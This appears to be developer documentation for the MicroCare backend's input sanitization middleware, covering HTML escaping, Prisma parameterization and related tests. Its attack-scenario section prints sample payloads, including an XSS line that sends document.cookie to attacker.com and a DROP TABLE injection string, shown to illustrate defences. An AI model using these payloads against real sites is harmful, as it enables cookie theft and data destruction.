# Input Sanitization and XSS Prevention

## Overview

This document describes the input sanitization implementation that prevents XSS (Cross-Site Scripting) and injection attacks in the MicroCare backend API.

**Requirements Addressed**: 4.1, 4.2

## Implementation Details

### 1. Sanitization Middleware

Located in: `src/middleware/validationMiddleware.ts`

The sanitization middleware provides three main functions:

#### `sanitizeString(input: string): string`
- Trims leading and trailing whitespace
- Escapes HTML special characters to prevent XSS:
  - `&` → `&amp;`
  - `<` → `&lt;`
  - `>` → `&gt;`
  - `"` → `&quot;`
  - `'` → `&#x27;`
  - `/` → `&#x2F;`

#### `sanitizeObject(obj: unknown): unknown`
- Recursively sanitizes all string values in an object
- Handles nested objects and arrays
- Preserves non-string types (numbers, booleans, null, undefined)

#### Middleware Functions
- `sanitizeRequestBody`: Sanitizes all string inputs in request body
- `sanitizeQueryParams`: Sanitizes all string values in query parameters
- `sanitizeUrlParams`: Sanitizes all string values in URL parameters

### 2. Global Middleware Integration

The sanitization middleware is applied globally in `src/index.ts`:

```typescript
// Input sanitization middleware (prevent XSS and injection attacks)
// Requirements: 4.1, 4.2
app.use(sanitizeRequestBody);
app.use(sanitizeQueryParams);
app.use(sanitizeUrlParams);
```

This ensures all incoming requests are sanitized before reaching route handlers.

### 3. Validation Layer

The validation middleware in `src/middleware/validationMiddleware.ts` also includes:

- `validateRequest(schema)`: Validates request body against a schema
- Input validation functions for specific fields:
  - `validateEmail()`: Validates email format
  - `validatePasswordStrength()`: Validates password requirements
  - `validateName()`: Validates user name
  - `validateEntryTitle()`: Validates entry title
  - `validateEntryContent()`: Validates entry content
  - `validateMood()`: Validates mood value
  - `validateTags()`: Validates tags array
  - `validatePagination()`: Validates pagination parameters

### 4. SQL Injection Prevention

SQL injection is prevented through:
- **Prisma ORM**: Uses parameterized queries automatically
- **Input Validation**: Validates all inputs before database operations
- **Type Safety**: TypeScript ensures type correctness

### 5. XSS Prevention

XSS attacks are prevented through:
- **HTML Escaping**: All HTML special characters are escaped
- **Input Sanitization**: Applied to all request inputs
- **Content Security Policy**: Helmet middleware enforces CSP headers
- **HttpOnly Cookies**: Prevents JavaScript access to authentication tokens

## Attack Scenarios Covered

### 1. Stored XSS
```javascript
// Malicious input
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">

// After sanitization
&lt;img src=x onerror=&quot;fetch(&#x27;http:&#x2F;&#x2F;attacker.com?cookie=&#x27;+document.cookie)&quot;&gt;
```

### 2. DOM-based XSS
```javascript
// Malicious input
<svg onload="alert('XSS')">

// After sanitization
&lt;svg onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
```

### 3. Event Handler XSS
```javascript
// Malicious input
<div onclick="alert('XSS')">Click me</div>

// After sanitization
&lt;div onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;&#x2F;div&gt;
```

### 4. JavaScript Protocol XSS
```javascript
// Malicious input
<a href="javascript:alert('XSS')">Click</a>

// After sanitization
&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click&lt;&#x2F;a&gt;
```

### 5. SQL Injection
```sql
-- Malicious input
'; DROP TABLE users; --

-- Stored safely as string (Prisma handles parameterization)
-- Database remains protected
```

## Testing

### Unit Tests
Located in: `src/middleware/validationMiddleware.test.ts`

Tests cover:
- HTML special character escaping
- Whitespace trimming
- Nested object sanitization
- Array sanitization
- Real-world XSS attack scenarios
- SQL injection attempts

Run tests:
```bash
npm test -- validationMiddleware.test.ts
```

### Integration Tests
Located in: `src/integration.test.ts`

Tests cover:
- XSS prevention in request body
- XSS prevention in query parameters
- SQL injection prevention
- Special character handling
- Update entry sanitization

Run tests:
```bash
npm test -- integration.test.ts
```

## API Endpoints Protected

All API endpoints benefit from sanitization:

### Authentication
- `POST /api/auth/register` - Sanitizes name, email, password
- `POST /api/auth/login` - Sanitizes email, password

### User Profile
- `GET /api/users/profile` - Sanitizes query parameters
- `PUT /api/users/profile` - Sanitizes name, email
- `POST /api/users/change-password` - Sanitizes passwords

### Journal Entries
- `POST /api/entries` - Sanitizes title, content, tags
- `GET /api/entries` - Sanitizes query parameters
- `GET /api/entries/:id` - Sanitizes URL parameters
- `PUT /api/entries/:id` - Sanitizes title, content, tags
- `DELETE /api/entries/:id` - Sanitizes URL parameters

## Best Practices

1. **Always Validate First**: Validation happens before sanitization
2. **Escape on Output**: Frontend should also escape data when displaying
3. **Use Parameterized Queries**: Prisma handles this automatically
4. **Content Security Policy**: Helmet middleware enforces CSP
5. **HttpOnly Cookies**: Prevents XSS token theft
6. **Regular Updates**: Keep dependencies updated for security patches

## Performance Considerations

- Sanitization adds minimal overhead (microseconds per request)
- Recursive sanitization is efficient for nested structures
- Middleware is applied globally for consistent protection
- No performance impact on non-string data types

## Future Enhancements

1. **DOMPurify Integration**: For more advanced HTML sanitization
2. **Rate Limiting**: Prevent brute force attacks
3. **Request Signing**: Verify request integrity
4. **Audit Logging**: Log suspicious requests
5. **Web Application Firewall**: Additional layer of protection

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Helmet.js Security Headers](https://helmetjs.github.io/)
- [Prisma Security](https://www.prisma.io/docs/concepts/more/security)
